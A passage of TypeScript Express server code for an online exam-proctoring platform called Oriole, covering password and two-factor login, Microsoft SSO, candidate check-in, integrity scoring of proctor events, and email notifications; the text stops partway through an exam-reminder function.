import express from "express";
import { PDFDocument, StandardFonts } from "pdf-lib";
import type { Request, Response } from "express";
import cookieParser from "cookie-parser";
import bcrypt from "bcryptjs";
import { nanoid } from "nanoid";
import path from "node:path";
import fs from "node:fs";
import { fileURLToPath } from "node:url";
import { createHmac, createHash, randomBytes } from "node:crypto";
import { db, initDb, snapshotStore, proctorStore, answerStore, auditStore, emailStore } from "./db.ts";
import { sendMail, mailerStatus, verifySmtp, buildHtml, ctaButton, esc } from "./mailer.ts";
import { sendSms, smsEnabled, smsStatus, recentSms } from "./sms.ts";
import {
  clearSession, currentUser, issueSession, requireAuth, requireRole, requireRoles, toSafeUser,
  issuePending2fa, pending2faUserId, clearPending2fa,
} from "./auth.ts";
import { generateSecret, verifyTotp, verifyTotpStep, otpauthUrl, generateBackupCodes } from "./totp.ts";
import { microsoftEnabled, authorizeUrl, exchangeCode } from "./sso.ts";
import { tryEvalExpr } from "../shared/expr.ts";
import { env, assertProductionEnv } from "./env.ts";
import { securityHeaders, authLimiter, apiLimiter, twoFaLimiter, assertSafeWebhookUrl } from "./security.ts";
import { logger, httpLogger } from "./logger.ts";
import { encryptString, decryptString, encryptionEnabled } from "./crypto.ts";
import { scheduleRetention, stopRetention } from "./retention.ts";
import { scheduleBackup, stopBackup, runBackup, backupStatus } from "./backup.ts";
import { validate } from "./validate.ts";
import { loginSchema, teamCreateSchema, passwordChangeSchema, passwordResetSchema, twoFaCodeSchema, twoFaDisableSchema } from "./schemas.ts";
import { verifySeb } from "./seb.ts";
import { nextStreak, displayStreak } from "./streak.ts";
import { shuffle, chooseQuestionIds, deadlineMs } from "./exam-delivery.ts";
import { runCode, CODE_LANGUAGES } from "./code-runner.ts";
import { gradeOne, parseMultiValue, rubricTotal } from "./grading.ts";
import { applyCurve, letterFor, cleanBands } from "../shared/grades.ts";
import { aiEnabled, assessDifficulty, narrateTrend } from "./ai.ts";

// Role groups for endpoint access. Staff = all back-office roles; graders = admin + facilitator.
const STAFF: ("admin" | "facilitator" | "proctor")[] = ["admin", "facilitator", "proctor"];
const GRADERS: ("admin" | "facilitator")[] = ["admin", "facilitator"];
import type {
  Answer, Attempt, Certificate, Exam, ExamListItem, ProctorEvent, PublicQuestion, Question, Registration, RubricCriterion, RegradeRequest, WebhookEvent,
  Book, BookGenre, ReadingProgress, ResourceType, ResourceDifficulty, ResourceVersion, ResourceBookmark, ResourceRating, ResourceDownloadLog, User,
  LearningStructureMode, AnnouncementRead,
} from "../shared/types.ts";
import {
  DEFAULT_LOCKDOWN, WEBHOOK_EVENTS, PROCTOR_EVENT_TYPES, BOOK_GENRES, RESOURCE_TYPES, RESOURCE_DIFFICULTIES,
  LEARNING_STRUCTURE_MODES, DEFAULT_LEARNING_STRUCTURE,
} from "../shared/types.ts";

/** Per-severity weight deducted from the integrity score for each logged violation. */
const SEVERITY_WEIGHT: Record<string, number> = { high: 12, warning: 5, info: 0 };

/** Number of non-informational (flagged) events. */
function flaggedCount(events: ProctorEvent[]): number {
  return events.filter((e) => e.severity !== "info").length;
}

/**
 * Retroactively drop the historical "Fullscreen Exit" false positive. Before the
 * submit-time guard existed, the app recorded a fullscreen_exit when it called
 * exitFullscreen() as part of finishing the exam. Any fullscreen_exit logged at
 * (or within ~2s before) the attempt's submit time is that teardown artefact —
 * not a real mid-exam exit — so it's stripped from scoring and display for
 * already-submitted attempts. New attempts never record it (client + server guards).
 */
function cleanEvents(events: ProctorEvent[], submittedAt?: string | null): ProctorEvent[] {
  if (!submittedAt) return events;
  const cutoff = new Date(submittedAt).getTime() - 2000;
  return events.filter((e) => !(e.type === "fullscreen_exit" && new Date(e.at).getTime() >= cutoff));
}

/** Live integrity score: 100 minus weighted deductions for logged violations. */
function scoreOf(events: ProctorEvent[]): number {
  let score = 100;
  for (const e of events) score -= SEVERITY_WEIGHT[e.severity] ?? 0;
  return Math.max(0, score);
}

/** Transparent breakdown of how the integrity score was reached, grouped by event type. */
function breakdownOf(events: ProctorEvent[]) {
  const groups = new Map<string, { type: string; severity: string; count: number; weight: number; deducted: number }>();
  for (const e of events) {
    const weight = SEVERITY_WEIGHT[e.severity] ?? 0;
    const g = groups.get(e.type) ?? { type: e.type, severity: e.severity, count: 0, weight, deducted: 0 };
    g.count += 1;
    g.deducted += weight;
    // Surface the most serious severity seen for this type.
    if ((SEVERITY_WEIGHT[e.severity] ?? 0) > (SEVERITY_WEIGHT[g.severity] ?? 0)) g.severity = e.severity;
    groups.set(e.type, g);
  }
  const deductions = [...groups.values()].sort((a, b) => b.deducted - a.deducted);
  const totalDeducted = deductions.reduce((s, d) => s + d.deducted, 0);
  return { base: 100, score: Math.max(0, 100 - totalDeducted), totalDeducted, deductions };
}

/** Most recent webcam frame for an attempt (queried directly, not mirrored). */
async function latestSnapshot(attemptId: string): Promise<string | null> {
  const latest = await snapshotStore.latest(attemptId);
  return latest ? (decryptString(latest.dataUrl) ?? null) : null;
}

/** The single org-settings record (always present after initDb). */
function getSettings() {
  return db.data!.settings.find((s) => s.id === "org")!;
}

/** Stable anonymized candidate label for double-blind grading. */
function anonLabel(attemptId: string) { return `Candidate #${attemptId.slice(-4).toUpperCase()}`; }
/** True when this attempt's identity should be hidden from graders (anonymous exam, not yet released). */
function isAnonymized(attempt: Attempt, exam: Exam | undefined): boolean {
  return !!exam?.anonymousGrading && attempt.gradingStatus !== "released";
}

/** Record an administrative action to the audit trail. */
async function recordAudit(req: Request, action: string, target: string) {
  const u = currentUser(req);
  const log = { id: nanoid(10), at: now(), actorId: u?.id ?? "system", actorName: u?.name ?? "System", action, target };
  await auditStore.add(log);
}

function invitationEmail(name: string, email: string, password: string) {
  const loginUrl = `${env.appUrl}/login`;
  const text =
    `Hi ${name},\n\nAn account has been created for you on Oriole.\n\n` +
    `Login:    ${email}\nPassword: ${password}\n\n` +
    `Sign in at ${loginUrl} — you can change your password after your first login.\n\n— Oriole`;
  const html = buildHtml(
    `<p style="margin:0 0 12px;font-size:15px;color:#111827"><strong>Hi ${esc(name)},</strong></p>
     <p style="margin:0 0 16px">An account has been created for you on <strong>Oriole</strong>. Use the credentials below to sign in.</p>
     <table role="presentation" cellpadding="0" cellspacing="0" style="background:#f9fafb;border:1px solid #e5e7eb;border-radius:6px;padding:14px 18px;margin:0 0 20px;width:100%">
       <tr><td style="font-size:13px;color:#6b7280;padding-bottom:4px">Email</td></tr>
       <tr><td style="font-size:15px;font-weight:700;color:#111827;padding-bottom:12px">${esc(email)}</td></tr>
       <tr><td style="font-size:13px;color:#6b7280;padding-bottom:4px">Temporary password</td></tr>
       <tr><td style="font-size:15px;font-weight:700;color:#111827;font-family:monospace">${esc(password)}</td></tr>
     </table>
     <p style="margin:0 0 4px;font-size:13px;color:#6b7280">You will be asked to change your password after your first login.</p>
     ${ctaButton("Sign in to Oriole", loginUrl)}`,
    email,
  );
  return { subject: "Your Oriole account is ready", text, html };
}

const app = express();
app.set("trust proxy", 1); // correct client IPs behind a load balancer (rate limiting, secure cookies)

// Force HTTPS in production. cPanel/LiteSpeed terminates SSL and proxies to us
// over http internally; the real client scheme is in x-forwarded-proto. Without
// this, a visitor on http:// silently loses the Secure session cookie → "login
// works but refresh logs me out" and authenticated API calls 401.
app.use((req, res, next) => {
  if (env.isProd && req.headers["x-forwarded-proto"] === "http") {
    return res.redirect(308, `https://${req.headers.host}${req.originalUrl}`);
  }
  next();
});

app.use(httpLogger); // structured request/response logging
app.use(securityHeaders); // helmet security headers
// Library book uploads (PDF documents) need more headroom than the global
// 2mb cap. Mounted BEFORE the global parser so it wins for this one path —
// body-parser is a no-op on a second pass once the body is already parsed.
app.use("/api/admin/books", express.json({ limit: "25mb" }));
app.use(express.json({ limit: "2mb" })); // webcam snapshots / verification photos
app.use(cookieParser());
app.use("/api/auth/login", authLimiter); // brute-force protection on credentials
app.use("/api/auth/signup", authLimiter);
app.use("/api/auth/2fa/verify", twoFaLimiter); // brute-force protection on 2FA codes / backup codes
app.use("/api", apiLimiter); // global API rate limit
// Never let a proxy/browser cache API responses — a cached /auth/me (user:null)
// would log users out on refresh, and stale data would mask updates.
app.use("/api", (_req, res, next) => { res.setHeader("Cache-Control", "no-store"); next(); });

const PORT = env.port;
const now = () => new Date().toISOString();

// In production, serve the built single-page app from the same origin.
const __dirname = path.dirname(fileURLToPath(import.meta.url));
const distDir = path.join(__dirname, "..", "dist");
const servingSpa = fs.existsSync(distDir);
if (servingSpa) {
  // Hashed assets (e.g. /assets/index-ABC123.js) are content-addressed — cache
  // them forever. index.html must NEVER be cached, or browsers keep loading an
  // old build (pointing at stale bundles) after a redeploy.
  app.use(express.static(distDir, {
    index: false,
    setHeaders: (res, filePath) => {
      if (filePath.includes(`${path.sep}assets${path.sep}`)) {
        res.setHeader("Cache-Control", "public, max-age=31536000, immutable");
      } else {
        res.setHeader("Cache-Control", "no-cache, no-store, must-revalidate");
      }
    },
  }));
}

// ---------------------------------------------------------------- AUTH
// Constant-time filler for a bcrypt.compare when no matching account exists — its
// hash is fixed and unrelated to any real user, so it's never actually satisfied,
// only used to burn the same CPU time a real comparison would.
const DUMMY_BCRYPT_HASH = bcrypt.hashSync("orcalis-timing-guard", 10);

app.post("/api/auth/login", validate(loginSchema), async (req, res) => {
  const { email, password } = req.body as { email: string; password: string };
  const user = db.data!.users.find((u) => u.email.toLowerCase() === String(email).toLowerCase());
  // Async bcrypt (not the sync variant): hashing is CPU-heavy, and the sync call
  // blocks the single event loop — during a login stampede that freezes every
  // other in-flight request (snapshots, answer saves). The async API yields.
  // Always run a bcrypt comparison, even when the email doesn't exist — otherwise
  // a nonexistent-email request short-circuits before ever calling bcrypt while a
  // wrong-password request takes ~100ms, letting an attacker measure response
  // time to enumerate which emails have accounts (CWE-208 timing side-channel).
  const passwordOk = await bcrypt.compare(String(password), user?.passwordHash ?? DUMMY_BCRYPT_HASH);
  if (!user || !passwordOk) {
    return res.status(401).json({ error: "Invalid email or password." });
  }
  // If 2FA is on, don't issue the session yet — set a short-lived challenge cookie
  // and ask the client for the authenticator code.
  if (user.twoFactorEnabled && user.twoFactorSecret) {
    issuePending2fa(res, user.id);
    return res.json({ twoFactorRequired: true });
  }
  issueSession(res, user);
  res.json({ user: toSafeUser(user) });
});

// Step 2 of a 2FA login: verify the authenticator code (or a backup code).
app.post("/api/auth/2fa/verify", validate(twoFaCodeSchema), async (req, res) => {
  const uid = pending2faUserId(req);
  if (!uid) return res.status(401).json({ error: "Your sign-in session expired. Please log in again." });
  const user = db.data!.users.find((u) => u.id === uid);
  if (!user || !user.twoFactorEnabled || !user.twoFactorSecret) {
    clearPending2fa(res);
    return res.status(400).json({ error: "Two-factor authentication is not set up." });
  }
  const code = String(req.body?.code ?? "").trim();
  // Replay guard: a TOTP code is valid for its whole ±30s window, so without
  // tracking which step was last accepted, a code observed/captured once (over
  // someone's shoulder, in a screen share, on an insecure network) could be
  // reused a second time before it naturally expires. Reject a step at or
  // before the last one this account already consumed.
  const step = verifyTotpStep(decryptString(user.twoFactorSecret) ?? "", code);
  let ok = step !== null && step > (user.twoFactorLastStep ?? -1);
  if (ok) {
    user.twoFactorLastStep = step;
    await db.upsert("users", user);
  }
  // Fall back to a one-time backup code (consumed on use).
  if (!ok && user.twoFactorBackupCodes?.length) {
    const normalized = code.toLowerCase().replace(/\s/g, "");
    for (let i = 0; i < user.twoFactorBackupCodes.length; i++) {
      if (await bcrypt.compare(normalized, user.twoFactorBackupCodes[i])) {
        user.twoFactorBackupCodes.splice(i, 1); // single-use
        await db.upsert("users", user);
        ok = true;
        break;
      }
    }
  }
  if (!ok) return res.status(401).json({ error: "Invalid code. Try again." });
  clearPending2fa(res);
  issueSession(res, user);
  res.json({ user: toSafeUser(user) });
});

app.post("/api/auth/logout", async (req, res) => {
  // Revoke this user's tokens server-side (not just clear the cookie) so a
  // captured session can't be replayed after logout.
  const user = currentUser(req);
  if (user) { user.tokenVersion = (user.tokenVersion ?? 0) + 1; await db.upsert("users", user); }
  clearSession(res);
  res.json({ ok: true });
});

// ---- account: 2FA setup / management (any signed-in user) ----
app.post("/api/auth/2fa/setup", requireAuth, async (req, res) => {
  const user = currentUser(req)!;
  const secret = generateSecret();
  // Encrypted at rest (same AES-256-GCM field encryption used for avatars/
  // snapshots) — a TOTP secret is a long-lived credential, so a DB leak
  // shouldn't hand over every account's second factor in plaintext.
  user.twoFactorPending = encryptString(secret);
  await db.upsert("users", user);
  res.json({ secret, otpauthUrl: otpauthUrl(secret, user.email) });
});

app.post("/api/auth/2fa/enable", requireAuth, validate(twoFaCodeSchema), async (req, res) => {
  const user = currentUser(req)!;
  if (!user.twoFactorPending) return res.status(400).json({ error: "Start setup first." });
  const code = String(req.body?.code ?? "").trim();
  const pendingSecret = decryptString(user.twoFactorPending) ?? "";
  if (!verifyTotp(pendingSecret, code)) return res.status(400).json({ error: "That code didn't match. Check your authenticator app and try again." });
  const backupCodes = generateBackupCodes(10);
  user.twoFactorSecret = user.twoFactorPending; // already encrypted — carry the ciphertext over as-is
  user.twoFactorPending = null;
  user.twoFactorEnabled = true;
  user.twoFactorLastStep = null;
  user.twoFactorBackupCodes = await Promise.all(backupCodes.map((c) => bcrypt.hash(c.toLowerCase(), 10)));
  await db.upsert("users", user);
  await recordAudit(req, "2fa.enabled", `${user.name} <${user.email}>`);
  res.json({ ok: true, backupCodes }); // plaintext shown exactly once
});

app.post("/api/auth/2fa/disable", requireAuth, validate(twoFaDisableSchema), async (req, res) => {
  const user = currentUser(req)!;
  if (!user.twoFactorEnabled) return res.json({ ok: true });
  // Require the current password OR a valid code to turn it off.
  const password = String(req.body?.password ?? "");
  const code = String(req.body?.code ?? "").trim();
  const okPw = password && (await bcrypt.compare(password, user.passwordHash));
  const okCode = code && user.twoFactorSecret && verifyTotp(decryptString(user.twoFactorSecret) ?? "", code);
  if (!okPw && !okCode) return res.status(401).json({ error: "Enter your password or a current authenticator code to disable 2FA." });
  user.twoFactorEnabled = false;
  user.twoFactorSecret = null;
  user.twoFactorPending = null;
  user.twoFactorLastStep = null;
  user.twoFactorBackupCodes = [];
  await db.upsert("users", user);
  await recordAudit(req, "2fa.disabled", `${user.name} <${user.email}>`);
  res.json({ ok: true });
});

app.get("/api/auth/me", (req, res) => {
  const user = currentUser(req);
  res.json({ user: user ? toSafeUser(user) : null });
});

// ---- Single Sign-On (Microsoft / Entra) ----
app.get("/api/auth/sso", (_req, res) => res.json({ microsoft: microsoftEnabled() }));

function ssoRedirectUri(req: Request): string {
  if (process.env.MS_REDIRECT_URI) return process.env.MS_REDIRECT_URI;
  const proto = (req.headers["x-forwarded-proto"] as string) || req.protocol;
  return `${proto}://${req.headers.host}/api/auth/sso/microsoft/callback`;
}

app.get("/api/auth/sso/microsoft/start", (req, res) => {
  if (!microsoftEnabled()) return res.status(404).send("Microsoft sign-in is not configured.");
  const state = randomBytes(16).toString("hex");
  res.cookie("orcalis_sso_state", state, { httpOnly: true, sameSite: "lax", secure: env.isProd, maxAge: 10 * 60 * 1000 });
  res.redirect(authorizeUrl(ssoRedirectUri(req), state));
});

app.get("/api/auth/sso/microsoft/callback", async (req, res) => {
  try {
    const { code, state } = req.query as { code?: string; state?: string };
    const cookieState = req.cookies?.orcalis_sso_state;
    res.clearCookie("orcalis_sso_state");
    if (!code || !state || !cookieState || state !== cookieState) return res.redirect("/login?sso=error");
    const info = await exchangeCode(String(code), ssoRedirectUri(req));
    if (!info) return res.redirect("/login?sso=error");
    // Only sign in an account that already exists — SSO never creates accounts.
    const user = db.data!.users.find((u) => u.email.toLowerCase() === info.email);
    if (!user) return res.redirect("/login?sso=nouser");
    issueSession(res, user);
    await recordAudit(req, "auth.sso", `${user.name} <${user.email}> (Microsoft)`);
    res.redirect("/");
  } catch {
    res.redirect("/login?sso=error");
  }
});

// ---------------------------------------------------------------- EXAMS (candidate)
app.get("/api/exams", requireAuth, async (req, res) => {
  const user = currentUser(req)!;
  // Candidates only ever see PUBLISHED exams. Each published exam is auto-enrolled
  // for the candidate (a registration is created lazily) so it appears in their
  // panel the moment an admin publishes it. Drafts/unpublished exams never show.
  const published = db.data!.exams.filter((e) => e.status === "published" && !e.practice);
  let mutated = false;
  const items: ExamListItem[] = [];

  for (const exam of published) {
    let registration = db.data!.registrations.find(
      (r) => r.candidateId === user.id && r.examId === exam.id,
    );
    // "assigned" exams are only visible to candidates an admin has assigned.
    // "open" exams auto-enroll every candidate on first view.
    if (!registration) {
      if (exam.enrollment === "assigned") continue;
      registration = {
        id: nanoid(10),
        examId: exam.id,
        candidateId: user.id,
        status: "registered",
        approval: getSettings().autoConfirmEnrollment ? "confirmed" : "pending",
        scheduledStart: null,
        systemCheckPassed: false,
        createdAt: now(),
      };
      db.data!.registrations.push(registration);
      mutated = true;
    }
    const attempt =
      db.data!.attempts
        .filter((a) => a.registrationId === registration!.id)
        .sort((a, b) => b.startedAt.localeCompare(a.startedAt))[0] ?? null;
    const questionCount = db.data!.questions.filter((q) => q.examId === exam.id).length;
    items.push({ registration, exam, attempt, questionCount });
  }

  if (mutated) await db.write();
  items.sort((a, b) => b.exam.createdAt.localeCompare(a.exam.createdAt));
  res.json({ items });
});

app.get("/api/exams/:registrationId", requireAuth, (req, res) => {
  const user = currentUser(req)!;
  const registration = db.data!.registrations.find(
    (r) => r.id === req.params.registrationId && r.candidateId === user.id,
  );
  if (!registration) return res.status(404).json({ error: "Registration not found." });
  const exam = db.data!.exams.find((e) => e.id === registration.examId)!;
  const questionCount = db.data!.questions.filter((q) => q.examId === exam.id).length;
  const totalPoints = db.data!.questions
    .filter((q) => q.examId === exam.id)
    .reduce((s, q) => s + q.points, 0);
  res.json({ registration, exam, questionCount, totalPoints });
});

// ---------------------------------------------------------------- CHECK-IN
app.post("/api/registrations/:id/checkin", requireAuth, async (req, res) => {
  const user = currentUser(req)!;
  const reg = db.data!.registrations.find((r) => r.id === req.params.id && r.candidateId === user.id);
  if (!reg) return res.status(404).json({ error: "Registration not found." });
  reg.systemCheckPassed = true;
  if (typeof req.body?.studentRef === "string") reg.studentRef = req.body.studentRef.trim();
  if (req.body?.accepted) reg.rulesAcceptedAt = now();
  if (typeof req.body?.verificationPhoto === "string" && req.body.verificationPhoto.startsWith("data:image/")) {
    reg.verificationPhoto = encryptString(req.body.verificationPhoto.slice(0, 300_000));
  }
  if (typeof req.body?.idDocumentPhoto === "string" && req.body.idDocumentPhoto.startsWith("data:image/")) {
    reg.idDocumentPhoto = encryptString(req.body.idDocumentPhoto.slice(0, 600_000));
  }
  if (Array.isArray(req.body?.roomScan)) {
    reg.roomScanPhotos = (req.body.roomScan as unknown[])
      .filter((s): s is string => typeof s === "string" && s.startsWith("data:image/"))
      .slice(0, 8)
      .map((s) => encryptString(s.slice(0, 200_000)));
  }
  if (reg.status === "registered") reg.status = "checked_in";
  if (!reg.checkedInAt) reg.checkedInAt = now();
  await db.upsert("registrations", reg);
  res.json({ registration: reg });
});

/** A proctor/facilitator confirms (or clears) that a candidate's photo-ID matches them. */
app.post("/api/admin/registrations/:id/verify-id", requireRoles(...STAFF), async (req, res) => {
  const actor = currentUser(req)!;
  const reg = db.data!.registrations.find((r) => r.id === req.params.id);
  if (!reg) return res.status(404).json({ error: "Registration not found." });
  const verified = req.body?.verified !== false;
  reg.idVerified = verified;
  reg.idVerifiedBy = verified ? actor.name : null;
  reg.idVerifiedAt = verified ? now() : null;
  await db.upsert("registrations", reg);
  const who = db.data!.users.find((u) => u.id === reg.candidateId);
  await recordAudit(req, verified ? "identity.verified" : "identity.unverified", who ? `${who.name} <${who.email}>` : reg.candidateId);
  res.json({ registration: reg });
});

// ---------------------------------------------------------------- ATTEMPTS

/** Full Question objects served to an attempt, in served order (legacy attempts → all exam questions). */
function servedQuestions(attempt: Attempt): Question[] {
  const all = db.data!.questions.filter((q) => q.examId === attempt.examId);
  if (!attempt.questionIds?.length) return all;
  const byId = new Map(all.map((q) => [q.id, q] as const));
  return attempt.questionIds.map((id) => byId.get(id)).filter((q): q is Question => !!q);
}

/** Public (answer-stripped) questions for an attempt, with the served option order. */
function servedPublicQuestions(attempt: Attempt): PublicQuestion[] {
  return servedQuestions(attempt).map((q) => {
    const base: PublicQuestion = {
      id: q.id, type: q.type, prompt: q.prompt,
      options: attempt.optionOrders?.[q.id] ?? q.options,
      points: q.points,
      sectionId: q.sectionId ?? null,
    };
    if (q.type === "code") return { ...base, codeLanguage: q.codeLanguage ?? "python", starterCode: q.starterCode ?? "", testCases: q.testCases ?? [] };
    // Matching: serve the left prompts (answer aligns to these) + the shuffled rights as options.
    if (q.type === "matching") return { ...base, matchPrompts: (q.matchPairs ?? []).map((p) => p.left), options: attempt.optionOrders?.[q.id] ?? (q.matchPairs ?? []).map((p) => p.right) };
    // Ordering: serve the shuffled items as options.
    if (q.type === "ordering") return { ...base, options: attempt.optionOrders?.[q.id] ?? (q.sequence ?? []) };
    if (q.type === "cloze") return { ...base, blankCount: (q.blanks ?? []).length };
    if (q.type === "hotspot") return { ...base, imageUrl: q.imageUrl };
    // Parameterized: substitute this attempt's frozen values into the prompt {name} markers.
    if (q.type === "parameterized") {
      const vals = attempt.paramValues?.[q.id];
      return { ...base, prompt: vals ? substituteParams(q.prompt, vals) : q.prompt, paramValues: vals };
    }
    return base;
  });
}

/** Replace {name} markers in a prompt with this attempt's frozen variable values. */
function substituteParams(template: string, vars: Record<string, number>): string {
  return template.replace(/\{(\w+)\}/g, (m, name: string) => (name in vars ? String(vars[name]) : m));
}

/** Parse a file-upload answer payload {name,type,data} for grader download. */
function parseFileUpload(value: string | undefined): { name: string; type: string; data: string } | null {
  if (!value) return null;
  try { const o = JSON.parse(value); if (o && typeof o.data === "string") return { name: String(o.name ?? "file"), type: String(o.type ?? ""), data: String(o.data) }; }
  catch { /* ignore */ }
  return null;
}
/** Parse a JSON-array answer value (matching / ordering / cloze) for display. */
function jsonArr(value: string | undefined): string[] {
  try { const a = JSON.parse((value ?? "").trim() || "[]"); return Array.isArray(a) ? a.map((x) => (x == null ? "" : String(x))) : []; }
  catch { return []; }
}
/** Human-readable correct answer for a review row. */
function displayCorrect(q: Question): string {
  switch (q.type) {
    case "multi_select": return (q.correctAnswers ?? []).join(", ");
    case "matching": return (q.matchPairs ?? []).map((p) => `${p.left} → ${p.right}`).join("; ");
    case "ordering": return (q.sequence ?? []).join(" → ");
    case "cloze": return (q.blanks ?? []).map((b) => b[0] ?? "").join(" | ");
    case "hotspot": return "Correct region on the image";
    default: return q.correctAnswer;
  }
}
/** Human-readable candidate answer for a review row. */
function displayAnswer(q: Question, value: string | undefined): string {
  const v = value ?? "";
  switch (q.type) {
    case "multi_select": return parseMultiValue(v).join(", ");
    case "matching": { const a = jsonArr(v); return (q.matchPairs ?? []).map((p, i) => `${p.left} → ${a[i] || "—"}`).join("; "); }
    case "ordering": return jsonArr(v).join(" → ");
    case "cloze": return jsonArr(v).map((s) => s || "—").join(" | ");
    case "hotspot": { try { const o = JSON.parse(v || "{}"); return Number.isFinite(o.x) ? `Clicked (${Math.round(o.x)}%, ${Math.round(o.y)}%)` : ""; } catch { return ""; } }
    case "file_upload": { try { const o = JSON.parse(v || "{}"); return o.name ? String(o.name) : (v ? "File uploaded" : ""); } catch { return v ? "File uploaded" : ""; } }
    default: return v;
  }
}

/** Grace window (minutes) after the scheduled start within which a candidate may still begin. */
const LATE_GRACE_MIN = 30;

/** Scheduled start (ISO) for a registration, or null if the exam isn't scheduled. */
function scheduledStartIso(reg: Registration | undefined, exam: Exam | undefined): string | null {
  return reg?.scheduledStart || exam?.availableFrom || null;
}

/** Hard deadline (epoch ms) for an in-progress attempt.
 *  When the exam is scheduled, the countdown is a FIXED window anchored to the
 *  scheduled start (everyone shares the same end time; a late joiner gets less
 *  time). Unscheduled exams fall back to start+duration. Capped by the exam close. */
function attemptDeadlineMs(attempt: Attempt): number {
  const exam = db.data!.exams.find((e) => e.id === attempt.examId);
  const reg = db.data!.registrations.find((r) => r.id === attempt.registrationId);
  const schedIso = scheduledStartIso(reg, exam);
  const anchorIso = schedIso ?? attempt.startedAt;
  const base = deadlineMs(anchorIso, attempt.durationMinutes, exam?.availableUntil ?? null);
  // Paused time is returned to the candidate: add accumulated pause + any current pause.
  let paused = attempt.pausedMs ?? 0;
  if (attempt.paused && attempt.pausedAt) paused += Math.max(0, Date.now() - new Date(attempt.pausedAt).getTime());
  // Accessibility accommodation: this student gets extra time on every exam.
  const cand = db.data!.users.find((u) => u.id === attempt.candidateId);
  const extra = Math.max(0, cand?.accommodationsExtraMinutes ?? 0) * 60_000;
  return base + paused + extra;
}

// ── Automatic notifications (best-effort; logged in mock mode, sent via SMTP in prod) ──
async function notifyResultReleased(attempt: Attempt) {
  const u = db.data!.users.find((x) => x.id === attempt.candidateId);
  const exam = db.data!.exams.find((e) => e.id === attempt.examId);
  if (!u || exam?.practice) return;
  const title = exam?.title ?? "your examination";
  const resultUrl = `${env.appUrl}/attempts/${attempt.id}/result`;
  const subject = `Your result is available — ${title}`;
  const scoreLabel = `${attempt.score}% — ${attempt.passed ? "Passed ✓" : "Not passed"}`;
  const text =
    `Hi ${u.name},\n\nYour result for "${title}" is now available.\n` +
    `Score: ${scoreLabel}\n\n` +
    `View the full breakdown at ${resultUrl}${attempt.passed ? "\nYour certificate is also available to download." : ""}\n\n— Oriole`;
  const html = buildHtml(
    `<p style="margin:0 0 12px;font-size:15px;color:#111827"><strong>Hi ${esc(u.name)},</strong></p>
     <p style="margin:0 0 16px">Your result for <strong>${esc(title)}</strong> is now available.</p>
     <table role="presentation" cellpadding="0" cellspacing="0" style="background:#f9fafb;border:1px solid #e5e7eb;border-radius:6px;padding:14px 18px;margin:0 0 20px;width:100%">
       <tr><td style="font-size:13px;color:#6b7280;padding-bottom:4px">Score</td></tr>
       <tr><td style="font-size:22px;font-weight:700;color:${attempt.passed ? "#059669" : "#dc2626"}">${attempt.score}%</td></tr>
       <tr><td style="font-size:13px;font-weight:600;color:${attempt.passed ? "#059669" : "#dc2626"};padding-top:4px">${attempt.passed ? "Passed" : "Not passed"}</td></tr>
     </table>
     ${attempt.passed ? `<p style="margin:0 0 16px;font-size:13px;color:#374151">Your certificate is available to download from the portal.</p>` : ""}
     ${ctaButton("View full result", resultUrl)}`,
    u.email,
  );
  try { await sendMail(u.email, subject, text, html); } catch { /* best-effort */ }
}

async function notifyRegistered(reg: Registration) {
  const u = db.data!.users.find((x) => x.id === reg.candidateId);
  const exam = db.data!.exams.find((e) => e.id === reg.examId);
  if (!u || exam?.practice) return;
  const whenIso = reg.scheduledStart || exam?.availableFrom || null;
  const when = whenIso ? new Date(whenIso).toLocaleString() : "the scheduled time";
  const title = exam?.title ?? "your examination";
  const portalUrl = `${env.appUrl}/exams`;
  const subject = `You're confirmed — ${title}`;
  const text =
    `Hi ${u.name},\n\nYou're confirmed to sit "${title}". It opens ${when}.\n\n` +
    `Sign in ahead of time to run your system check so you're ready to start.\n${portalUrl}\n\n— Oriole`;
  const html = buildHtml(
    `<p style="margin:0 0 12px;font-size:15px;color:#111827"><strong>Hi ${esc(u.name)},</strong></p>
     <p style="margin:0 0 16px">You are confirmed to sit <strong>${esc(title)}</strong>.</p>
     <table role="presentation" cellpadding="0" cellspacing="0" style="background:#f9fafb;border:1px solid #e5e7eb;border-radius:6px;padding:14px 18px;margin:0 0 20px;width:100%">
       <tr><td style="font-size:13px;color:#6b7280;padding-bottom:4px">Opens</td></tr>
       <tr><td style="font-size:15px;font-weight:700;color:#111827">${when}</td></tr>
     </table>
     <p style="margin:0 0 4px;font-size:13px;color:#6b7280">Sign in ahead of time to run your system check (camera, microphone, network) so you're ready to start.</p>
     ${ctaButton("Go to my exams", portalUrl)}`,
    u.email,
  );
  try { await sendMail(u.email, subject, text, html); } catch { /* best-effort */ }
}

/** Periodic sweep: send 24h / 1h "starting soon" reminders once each, per confirmed upcoming exam. */
async function sendExamReminders() {
  const nowMs = Date.now();
  for (const reg of db.data!.registrations) {
    if (reg.approval !== "confirmed" || reg.status === "submitted") continue;
    const exam = db.data!.exams.find((e) => e.id === reg.examId);
    if (!exam || exam.practice) continue;
    const startIso = reg.scheduledStart || exam.availableFrom;
    if (!startIso) continue;
    const hoursUntil = (new Date(startIso).getTime() - nowMs) / 3_600_000;
    if (hoursUntil <= 0) continue;
    const u = db.data!.users.find((x) => x.id === reg.candidateId);
    if (!u) continue;
    const sent = reg.remindersSent ?? [];
    const fire = async (tag: string, label: string) => {
      if (sent.includes(tag)) return false;
      const when = new Date(startIso).toLocaleString();
      const portalUrl = `${env.appUrl}/exams`;
      const text = `Hi ${u.name},\n\n"${exam.title}" starts ${label} (${when}).\nMake sure you're ready and run your system check beforehand.\n${portalUrl}\n\n— Oriole`;
      const html = buildHtml(
        `<p style="margin:0 0 12px;font-size:15px;color:#111827"><strong>Hi ${esc(u.name)},</strong></p>
         <p style="margin:0 0 16px">This is a reminder that <strong>${esc(exam.title)}</strong> starts <strong>${label}</strong>.</p>
         <table role="presentation" cellpadding="0" cellspacing="0" style="background:#f9fafb;border:1px solid #e5e7eb;border-radius:6px;padding:14px 18px;margin:0 0 20px;width:100%">
           <tr><td style="font-size:13px;color:#6b7280;padding-bottom:4px">Starts at</td></tr>
           <tr><td style="font-size:15px;font-weight:700;color:#111827">${when}</td></tr>
         </table>
         <p style="margin:0 0 4px;font-size:13px;color:#6b7280">Run your system check (camera, microphone, network) before signing in to make sure you're ready to start.</p>
         ${ctaButton("Go to my exams", portalUrl)}`,
        u.email,
      );
      try { await sendMail(u.email, `Reminder — ${exam.title} starts ${label}`, text, html); } catch { /* best-effort */ }
      // Optional SMS/WhatsApp reminder (only when enabled in settings, a provider is configured, and the student has a phone).
      if ((getSettings().smsReminders ?? false) && smsEnabled() && u.phone) {
